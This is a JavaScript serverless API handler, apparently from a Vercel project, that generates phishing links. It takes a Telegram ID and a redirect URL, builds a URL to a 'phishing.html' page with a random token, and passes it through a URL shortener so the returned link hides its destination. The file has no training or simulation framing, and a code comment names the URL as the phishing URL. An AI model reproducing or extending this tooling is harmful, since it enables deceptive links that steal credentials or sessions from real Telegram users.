export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, redirectUrl } = req.body;

    if (!telegramId || !redirectUrl) {
      return res.status(400).json({ error: 'Missing telegramId or redirectUrl' });
    }

    // Generate token
    const token = [...Array(32)].map(() =>
      Math.random().toString(36)[2]).join('');
    const expiry = Date.now() + 24 * 60 * 60 * 1000;

    // Your full phishing URL
    const phishingUrl = `https://opaslabs.vercel.app/phishing.html?telegramId=${telegramId}&redirectUrl=${encodeURIComponent(redirectUrl)}&token=${token}`;

    // 🔗 Call your own shortener API
    const shortenerRes = await fetch(`https://${req.headers.host}/api/shorten`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ longUrl: phishingUrl }),
    });

    if (!shortenerRes.ok) {
      throw new Error('URL shortener failed');
    }

    const { shortUrl } = await shortenerRes.json();

    res.status(200).json({ link: shortUrl });

  } catch (error) {
    console.error('Generation error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};
